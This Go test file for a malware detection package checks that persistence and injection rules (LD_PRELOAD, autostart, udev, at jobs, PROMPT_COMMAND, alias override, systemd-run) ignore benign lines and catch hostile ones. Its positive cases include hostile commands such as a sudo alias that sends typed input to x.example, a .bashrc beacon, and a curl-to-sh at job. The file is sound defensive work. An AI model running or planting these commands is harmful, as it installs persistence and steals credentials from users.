package detect

import "testing"

// Pass 14 (2026-10-26): the long tail of text rules from the same replay as audit_text_fp_test.go.
// Each negative is a real withdrawn line; each positive is the hostile shape the rule exists for.
// The replay numbers are in each rule's comment in patterns.toml.

// Injection and persistence rules fired on the variable or path name: printed shell-integration
// snippets, sanitizer preloads, device-permission rules, prose times and cgroup wrappers.
func TestAuditInjectionAndPersistenceNeedTheAct(t *testing.T) {
	neg := []ruleCase{
		{"P-LD-PRELOAD", "npm", `test:asan: ADAPT_ASAN=1 node-gyp rebuild && LD_PRELOAD=$(gcc -print-file-name=libasan.so):$(gcc -print-file-name=libubsan.so) ASAN_OPTIONS=detect_leaks=0 node test.js`},
		{"P-LD-PRELOAD", "go", `cmd.Env = append(os.Environ(), "LD_PRELOAD=")`},
		{"P-LD-PRELOAD", "aur", `export LD_PRELOAD=/usr/lib/libfakeroot/libfakeroot.so`},
		{"P-LD-PRELOAD", "go", `{"LD_PRELOAD rejected", []string{"LD_PRELOAD=/tmp/x.so"}, true},`},
		{"P-LD-PRELOAD", "pypi", `Raw value:     export LD_PRELOAD=/tmp/.libssl.so`},
		{"P-XDG-AUTOSTART", "pypi", `autostart_dir = os.path.expanduser("~/.config/autostart")`},
		{"P-XDG-AUTOSTART", "go", `mkdir -p /root/.config/autostart/`},
		{"P-XDG-AUTOSTART", "pypi", `PERSIST_HOME_DIRS = (".local/bin", ".config/autostart", ".config/systemd", ".config/environment.d", ".config/fish",`},
		{"P-UDEV-RULE", "pypi", `echo 'SUBSYSTEM=="usb", ATTRS{idVendor}=="303a", MODE="0666"' | sudo tee /etc/udev/rules.d/99-m5stack.rules`},
		{"P-UDEV-RULE", "cargo", `pub const UDEV_RULE_PATH_SYSTEM: &str = "/etc/udev/rules.d/99-HyperHeadset.rules";`},
		{"P-AT-JOB", "pypi", `at 21:59 saved at 22:33 and erased three closes written in between.`},
		{"P-AT-JOB", "packagist", `. '            "yes": "see {link} y {lonk} at 08:00",' . PHP_EOL`},
		{"P-AT-JOB", "go", `invalid.mac (1.2.3.4) at 12:34:56:78:910 on el0 ifscope [ethernet]`},
		{"P-PROMPT-COMMAND", "npm", `PROMPT_COMMAND="__devclaw_prompt_command${PROMPT_COMMAND:+;$PROMPT_COMMAND}"`},
		{"P-PROMPT-COMMAND", "npm", "readyCommand: `stty -echo 2>/dev/null; export PS1= PS2= PROMPT_COMMAND=; printf '\\n%s%s\\n' '${markers.readyPrefix}' '${markers.readySuffix}'`,"},
		{"P-ALIAS-OVERRIDE", "pypi", `alias ls='ls --color=auto'`},
		{"P-ALIAS-OVERRIDE", "go", `writeFile(t, filepath.Join(dir, "bashrc"), "alias ls='ls -la'")`},
		{"G-SYSTEMD-RUN", "pypi", `f"systemd-run --user --collect --unit={unit} bash -lc {shlex.quote(inner)} "`},
		{"G-SYSTEMD-RUN", "go", `return "", fmt.Errorf("systemd-run not in PATH; TTL safety net disabled")`},
		{"G-SYSTEMD-RUN", "pypi", `_GUEST_REBOOT_COMMAND = "/usr/bin/systemd-run --quiet --on-active=1s /usr/bin/systemctl reboot"`},
	}
	pos := []ruleCase{
		{"P-LD-PRELOAD", "npm", `export LD_PRELOAD=/tmp/.libssl.so`},
		{"P-LD-PRELOAD", "npm", `cmd = exec.Command("sh", "-c", "LD_PRELOAD=/dev/shm/hook.so /usr/bin/sudo -v")`},
		{"P-LD-PRELOAD", "npm", `cd /tmp && LD_PRELOAD=/var/tmp/x.so passwd`},
		{"P-XDG-AUTOSTART", "npm", `cp /tmp/.x.desktop ~/.config/autostart/updater.desktop`},
		{"P-XDG-AUTOSTART", "npm", `printf '[Desktop Entry]\nExec=/tmp/.x\n' > "$HOME/.config/autostart/x.desktop"`},
		{"P-UDEV-RULE", "npm", `echo 'ACTION=="add", RUN+="/tmp/.x"' > /etc/udev/rules.d/99-x.rules`},
		{"P-AT-JOB", "npm", `echo "curl -s http://x.example/p | sh" | at now + 1 minute`},
		{"P-AT-JOB", "npm", `at -f /tmp/.job now`},
		{"P-AT-JOB", "npm", `subprocess.run(["at", "now"], input=payload)`},
		{"P-PROMPT-COMMAND", "npm", `echo 'PROMPT_COMMAND="curl -s http://x.example/b?u=$USER"' >> ~/.bashrc`},
		{"P-PROMPT-COMMAND", "npm", `fs.appendFileSync(path.join(os.homedir(), '.bashrc'), 'PROMPT_COMMAND="_h;$PROMPT_COMMAND"\n')`},
		{"P-ALIAS-OVERRIDE", "npm", `echo "alias sudo='sudo -S'" >> ~/.bashrc`},
		{"P-ALIAS-OVERRIDE", "npm", `alias sudo='curl -s http://x.example/p -d "$(cat)"; sudo'`},
		{"G-SYSTEMD-RUN", "npm", `sudo systemd-run -t /bin/sh`},
		{"G-SYSTEMD-RUN", "npm", `systemd-run --user --on-calendar=hourly /tmp/.x`},
	}
	checkRuleCases(t, neg, pos)
}
